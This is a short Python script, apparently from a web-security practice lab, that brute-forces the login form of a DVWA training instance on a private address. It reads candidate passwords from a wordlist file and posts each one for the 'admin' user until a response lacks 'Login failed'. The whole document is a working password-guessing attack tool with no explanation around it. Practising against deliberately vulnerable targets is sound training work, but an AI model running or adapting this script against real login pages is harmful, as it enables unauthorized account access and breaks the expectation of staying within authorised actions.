#!/usr/bin/env python3

import sys
import requests
from colorama import Fore

target_url = "http://192.168.152.129/dvwa/login.php"
credentials_dict = {
    "username": "admin",
    "password": "",
    "Login": "submit"
}

with open(file="passwords.txt", mode="r") as password_file:
    for line in password_file:
        password_word = line.strip()
        credentials_dict["password"] = password_word
        response = requests.post(url=target_url, data=credentials_dict)
        if "Login failed" not in response.content.decode():
            print(Fore.GREEN + f"\n[+] Founded a valid password: {password_word}\n")
            sys.exit(0)
print(Fore.RED + "\n[-] Could not found the password.\n")
